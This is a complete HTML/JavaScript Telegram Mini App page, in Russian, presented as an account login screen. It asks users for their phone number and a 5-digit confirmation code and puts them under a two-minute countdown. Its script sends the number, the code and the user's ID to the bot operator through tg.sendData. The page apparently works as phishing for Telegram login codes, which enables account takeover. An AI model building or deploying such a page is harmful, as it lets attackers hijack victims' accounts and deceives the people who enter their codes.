<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Mini App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background: var(--tg-theme-bg-color, #0e1621);
            color: var(--tg-theme-text-color, #ffffff);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            max-width: 400px;
            width: 100%;
        }
        
        .card {
            background: var(--tg-theme-secondary-bg-color, #17212b);
            border-radius: 20px;
            padding: 24px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.5);
        }
        
        h1 {
            font-size: 24px;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .subtitle {
            color: var(--tg-theme-hint-color, #6c7883);
            margin-bottom: 24px;
            font-size: 14px;
        }
        
        .user-info {
            background: var(--tg-theme-bg-color, #0e1621);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 24px;
            display: flex;
            align-items: center;
            gap: 12px;
            border: 1px solid var(--tg-theme-hint-color, #2b3b4c);
        }
        
        .avatar {
            width: 48px;
            height: 48px;
            border-radius: 24px;
            background: var(--tg-theme-button-color, #2b5278);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        
        .user-details {
            flex: 1;
        }
        
        .user-name {
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 4px;
        }
        
        .user-id {
            font-size: 12px;
            color: var(--tg-theme-hint-color, #6c7883);
        }
        
        /* Статус бар */
        .status-bar {
            background: var(--tg-theme-bg-color, #0e1621);
            border-radius: 12px;
            padding: 12px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-left: 4px solid var(--tg-theme-button-color, #2b5278);
        }
        
        .status-text {
            font-size: 14px;
        }
        
        .status-icon {
            width: 20px;
            height: 20px;
            border-radius: 10px;
            background: var(--tg-theme-button-color, #2b5278);
        }
        
        .status-icon.success {
            background: #4CAF50;
        }
        
        .status-icon.error {
            background: #f44336;
        }
        
        .status-icon.waiting {
            background: #FF9800;
            animation: pulse 1s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        /* Дисплей для номера/кода */
        .display-box {
            background: var(--tg-theme-bg-color, #0e1621);
            border: 2px solid var(--tg-theme-hint-color, #2b3b4c);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 20px;
            text-align: center;
            font-size: 24px;
            font-family: monospace;
            min-height: 70px;
            display: flex;
            align-items: center;
            justify-content: center;
            word-break: break-all;
            transition: all 0.3s;
        }
        
        .display-box.active {
            border-color: var(--tg-theme-button-color, #2b5278);
            box-shadow: 0 0 10px rgba(43, 82, 120, 0.3);
        }
        
        .display-box.code-mode {
            font-size: 32px;
            letter-spacing: 8px;
        }
        
        .display-label {
            font-size: 12px;
            color: var(--tg-theme-hint-color, #6c7883);
            margin-bottom: 4px;
            text-align: center;
        }
        
        /* Прогресс бар */
        .progress-container {
            width: 100%;
            height: 20px;
            background: var(--tg-theme-bg-color, #0e1621);
            border-radius: 10px;
            margin: 20px 0;
            overflow: hidden;
            position: relative;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--tg-theme-button-color, #2b5278), #4CAF50);
            width: 0%;
            transition: width 0.1s linear;
        }
        
        .progress-text {
            text-align: center;
            font-size: 12px;
            color: var(--tg-theme-hint-color, #6c7883);
            margin-top: 5px;
        }
        
        /* Таймер */
        .timer-container {
            text-align: center;
            margin: 20px 0;
            padding: 15px;
            background: var(--tg-theme-bg-color, #0e1621);
            border-radius: 12px;
        }
        
        .timer-display {
            font-size: 36px;
            font-weight: 600;
            font-family: monospace;
            color: var(--tg-theme-button-color, #2b5278);
        }
        
        .timer-display.warning {
            color: #FF9800;
        }
        
        .timer-display.expired {
            color: #f44336;
        }
        
        .timer-label {
            font-size: 12px;
            color: var(--tg-theme-hint-color, #6c7883);
            margin-top: 5px;
        }
        
        /* Цифровая клавиатура */
        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin: 20px 0;
        }
        
        .key {
            background: var(--tg-theme-bg-color, #0e1621);
            border: 1px solid var(--tg-theme-hint-color, #2b3b4c);
            border-radius: 16px;
            padding: 18px;
            font-size: 22px;
            font-weight: 600;
            text-align: center;
            cursor: pointer;
            transition: all 0.1s;
            user-select: none;
        }
        
        .key:active {
            background: var(--tg-theme-button-color, #2b5278);
            transform: scale(0.95);
        }
        
        .key.zero {
            grid-column: span 2;
        }
        
        .key.delete {
            background: #d32f2f;
            color: white;
        }
        
        .key.delete:active {
            background: #b71c1c;
        }
        
        .key.confirm {
            background: #4CAF50;
            color: white;
        }
        
        .key.confirm:active {
            background: #388E3C;
        }
        
        .key.switch-mode {
            background: var(--tg-theme-secondary-bg-color, #232e3c);
        }
        
        .key:disabled {
            opacity: 0.3;
            pointer-events: none;
        }
        
        /* Кнопки действий */
        .action-buttons {
            display: flex;
            gap: 10px;
            margin: 20px 0;
        }
        
        .action-btn {
            flex: 1;
            background: var(--tg-theme-bg-color, #0e1621);
            border: 1px solid var(--tg-theme-hint-color, #2b3b4c);
            border-radius: 12px;
            padding: 12px;
            text-align: center;
            cursor: pointer;
            transition: all 0.1s;
            font-size: 14px;
        }
        
        .action-btn:active {
            background: var(--tg-theme-button-color, #2b5278);
        }
        
        .action-btn.primary {
            background: var(--tg-theme-button-color, #2b5278);
            border-color: var(--tg-theme-button-color, #2b5278);
        }
        
        /* Навигационные кнопки */
        .nav-buttons {
            display: flex;
            gap: 10px;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid var(--tg-theme-hint-color, #2b3b4c);
        }
        
        .nav-btn {
            flex: 1;
            background: var(--tg-theme-bg-color, #0e1621);
            border: 1px solid var(--tg-theme-hint-color, #2b3b4c);
            border-radius: 12px;
            padding: 12px;
            text-align: center;
            cursor: pointer;
            transition: all 0.1s;
            font-size: 14px;
        }
        
        .nav-btn:active {
            background: var(--tg-theme-button-color, #2b5278);
        }
        
        .nav-btn.back {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>📱 Вход в аккаунт</h1>
            <div class="subtitle">Нажми кнопку для отправки номера</div>
            
            <!-- Информация о пользователе -->
            <div class="user-info">
                <div class="avatar" id="userAvatar">👤</div>
                <div class="user-details">
                    <div class="user-name" id="userName">Загрузка...</div>
                    <div class="user-id" id="userId">ID: ...</div>
                </div>
            </div>
            
            <!-- Статус бар (обновляется каждую секунду) -->
            <div class="status-bar" id="statusBar">
                <span class="status-text" id="statusText">Ожидание действий</span>
                <span class="status-icon" id="statusIcon"></span>
            </div>
            
            <!-- Дисплей для отображения номера/кода -->
            <div class="display-label" id="displayLabel">Введите номер</div>
            <div class="display-box" id="displayBox"></div>
            
            <!-- Прогресс бар (появляется при действиях) -->
            <div id="progressSection" class="hidden">
                <div class="progress-container">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <div class="progress-text" id="progressText">0%</div>
            </div>
            
            <!-- Таймер (появляется после отправки кода) -->
            <div id="timerSection" class="hidden">
                <div class="timer-container">
                    <div class="timer-display" id="timerDisplay">02:00</div>
                    <div class="timer-label">Осталось для ввода кода</div>
                </div>
            </div>
            
            <!-- Цифровая клавиатура -->
            <div class="keypad" id="keypad">
                <div class="key" onclick="addDigit(1)">1</div>
                <div class="key" onclick="addDigit(2)">2</div>
                <div class="key" onclick="addDigit(3)">3</div>
                <div class="key" onclick="addDigit(4)">4</div>
                <div class="key" onclick="addDigit(5)">5</div>
                <div class="key" onclick="addDigit(6)">6</div>
                <div class="key" onclick="addDigit(7)">7</div>
                <div class="key" onclick="addDigit(8)">8</div>
                <div class="key" onclick="addDigit(9)">9</div>
                <div class="key delete" onclick="deleteDigit()">⌫</div>
                <div class="key zero" onclick="addDigit(0)">0</div>
                <div class="key confirm" onclick="confirmInput()">✓</div>
            </div>
            
            <!-- Кнопки действий -->
            <div class="action-buttons">
                <div class="action-btn" onclick="requestContact()">📱 Отправить контакт</div>
                <div class="action-btn primary" onclick="clearDisplay()">🔄 Очистить</div>
            </div>
            
            <!-- Навигационные кнопки -->
            <div class="nav-buttons">
                <div class="nav-btn back" onclick="goBack()">
                    <span>←</span> Назад
                </div>
                <div class="nav-btn" onclick="switchMode()" id="modeSwitch">
                    🔢 Режим кода
                </div>
                <div class="nav-btn" onclick="resetApp()">
                    🔄 Сброс
                </div>
            </div>
        </div>
    </div>

    <script>
        // Инициализация Telegram Web App
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();
        
        // Данные пользователя
        const user = tg.initDataUnsafe?.user;
        let phoneNumber = '';
        let codeDigits = '';
        let currentMode = 'phone'; // 'phone' или 'code'
        let timerInterval = null;
        let progressInterval = null;
        let timeLeft = 120; // 2 минуты
        let updateInterval = null;
        
        // Отображение информации о пользователе
        if (user) {
            document.getElementById('userName').textContent = user.first_name + (user.last_name ? ' ' + user.last_name : '');
            document.getElementById('userId').textContent = `ID: ${user.id}`;
            document.getElementById('userAvatar').textContent = user.first_name?.charAt(0) || '👤';
        }
        
        // Обновление интерфейса каждую секунду
        function startUpdateInterval() {
            if (updateInterval) clearInterval(updateInterval);
            updateInterval = setInterval(updateInterface, 1000);
        }
        
        function updateInterface() {
            // Обновляем статус
            updateStatus();
            
            // Обновляем отображение
            updateDisplay();
        }
        
        function updateStatus() {
            const statusText = document.getElementById('statusText');
            const statusIcon = document.getElementById('statusIcon');
            
            if (phoneNumber) {
                statusText.textContent = `✅ Номер: ${phoneNumber}`;
                statusIcon.className = 'status-icon success';
            } else if (currentMode === 'code' && codeDigits) {
                statusText.textContent = `🔑 Код: ${codeDigits}`;
                statusIcon.className = 'status-icon success';
            } else {
                statusText.textContent = '⏳ Ожидание ввода';
                statusIcon.className = 'status-icon waiting';
            }
        }
        
        function updateDisplay() {
            const display = document.getElementById('displayBox');
            const label = document.getElementById('displayLabel');
            
            if (currentMode === 'phone') {
                label.textContent = 'Введите номер телефона';
                display.textContent = phoneNumber || '—';
                display.classList.remove('code-mode');
            } else {
                label.textContent = 'Введите код подтверждения';
                display.textContent = codeDigits || '____';
                display.classList.add('code-mode');
            }
        }
        
        // Функции для работы с цифрами
        function addDigit(digit) {
            if (currentMode === 'phone') {
                if (phoneNumber.length < 15) {
                    phoneNumber += digit;
                    showProgress('Ввод номера...', 20);
                }
            } else {
                if (codeDigits.length < 5) {
                    codeDigits += digit;
                    showProgress('Ввод кода...', 20);
                }
            }
            updateDisplay();
            updateStatus();
        }
        
        function deleteDigit() {
            if (currentMode === 'phone') {
                phoneNumber = phoneNumber.slice(0, -1);
            } else {
                codeDigits = codeDigits.slice(0, -1);
            }
            showProgress('Удаление...', 10);
            updateDisplay();
            updateStatus();
        }
        
        function clearDisplay() {
            if (currentMode === 'phone') {
                phoneNumber = '';
            } else {
                codeDigits = '';
            }
            showProgress('Очистка...', 10);
            updateDisplay();
            updateStatus();
        }
        
        function confirmInput() {
            if (currentMode === 'phone') {
                if (phoneNumber.length >= 10) {
                    showProgress('Отправка номера...', 50);
                    tg.sendData(JSON.stringify({
                        action: 'phone_entered',
                        phone: phoneNumber,
                        user_id: user?.id
                    }));
                    showStatus('success', '✅ Номер отправлен');
                    switchMode();
                } else {
                    showStatus('error', '❌ Слишком короткий номер');
                }
            } else {
                if (codeDigits.length === 5) {
                    showProgress('Проверка кода...', 50);
                    tg.sendData(JSON.stringify({
                        action: 'code_entered',
                        code: codeDigits,
                        user_id: user?.id
                    }));
                    showStatus('success', '✅ Код отправлен');
                    startTimer();
                } else {
                    showStatus('error', '❌ Введите 5 цифр');
                }
            }
        }
        
        // Запрос контакта через Telegram
        function requestContact() {
            showProgress('Запрос контакта...', 30);
            showStatus('waiting', '⏳ Запрос контакта...');
            
            tg.requestContact((success, response) => {
                if (success) {
                    const contact = response.contact;
                    phoneNumber = contact.phone_number;
                    showProgress('Обработка...', 20);
                    showStatus('success', '✅ Контакт получен');
                    updateDisplay();
                    updateStatus();
                    
                    tg.sendData(JSON.stringify({
                        action: 'contact_received',
                        phone: phoneNumber,
                        user_id: user?.id
                    }));
                } else {
                    showStatus('error', '❌ Отказ от отправки');
                }
                hideProgress();
            });
        }
        
        // Переключение режимов
        function switchMode() {
            currentMode = currentMode === 'phone' ? 'code' : 'phone';
            document.getElementById('modeSwitch').textContent = 
                currentMode === 'phone' ? '🔢 Режим кода' : '📞 Режим номера';
            clearDisplay();
            showProgress('Смена режима...', 10);
        }
        
        // Навигация назад
        function goBack() {
            showProgress('Возврат...', 10);
            tg.BackButton.onClick(() => {});
            tg.close();
        }
        
        // Сброс приложения
        function resetApp() {
            phoneNumber = '';
            codeDigits = '';
            currentMode = 'phone';
            stopTimer();
            hideProgress();
            showStatus('info', '🔄 Сброс выполнен');
            updateDisplay();
            updateStatus();
            document.getElementById('modeSwitch').textContent = '🔢 Режим кода';
        }
        
        // Прогресс бар
        function showProgress(text, duration = 30) {
            const section = document.getElementById('progressSection');
            const fill = document.getElementById('progressFill');
            const progressText = document.getElementById('progressText');
            
            section.classList.remove('hidden');
            progressText.textContent = text;
            
            if (progressInterval) clearInterval(progressInterval);
            
            let progress = 0;
            progressInterval = setInterval(() => {
                progress += 1;
                fill.style.width = progress + '%';
                
                if (progress >= 100) {
                    clearInterval(progressInterval);
                    setTimeout(() => {
                        section.classList.add('hidden');
                    }, 500);
                }
            }, duration * 10);
        }
        
        function hideProgress() {
            if (progressInterval) {
                clearInterval(progressInterval);
                progressInterval = null;
            }
            document.getElementById('progressSection').classList.add('hidden');
        }
        
        // Статус сообщения
        function showStatus(type, message) {
            const statusBar = document.getElementById('statusBar');
            const statusText = document.getElementById('statusText');
            const statusIcon = document.getElementById('statusIcon');
            
            statusText.textContent = message;
            
            if (type === 'success') {
                statusIcon.className = 'status-icon success';
                statusBar.style.borderLeftColor = '#4CAF50';
            } else if (type === 'error') {
                statusIcon.className = 'status-icon error';
                statusBar.style.borderLeftColor = '#f44336';
            } else {
                statusIcon.className = 'status-icon waiting';
                statusBar.style.borderLeftColor = '#FF9800';
            }
        }
        
        // Таймер
        function startTimer() {
            const section = document.getElementById('timerSection');
            const display = document.getElementById('timerDisplay');
            
            section.classList.remove('hidden');
            
            if (timerInterval) clearInterval(timerInterval);
            
            timeLeft = 120;
            timerInterval = setInterval(() => {
                const mins = Math.floor(timeLeft / 60);
                const secs = timeLeft % 60;
                display.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 30) {
                    display.classList.add('warning');
                }
                if (timeLeft <= 10) {
                    display.classList.remove('warning');
                    display.classList.add('expired');
                }
                
                timeLeft--;
                
                if (timeLeft < 0) {
                    clearInterval(timerInterval);
                    display.textContent = '00:00';
                    showStatus('error', '⌛ Время вышло');
                }
            }, 1000);
        }
        
        function stopTimer() {
            if (timerInterval) {
                clearInterval(timerInterval);
                timerInterval = null;
            }
            document.getElementById('timerSection').classList.add('hidden');
        }
        
        // Инициализация
        startUpdateInterval();
        
        // Показываем кнопку назад
        tg.BackButton.show();
    </script>
</body>
</html>
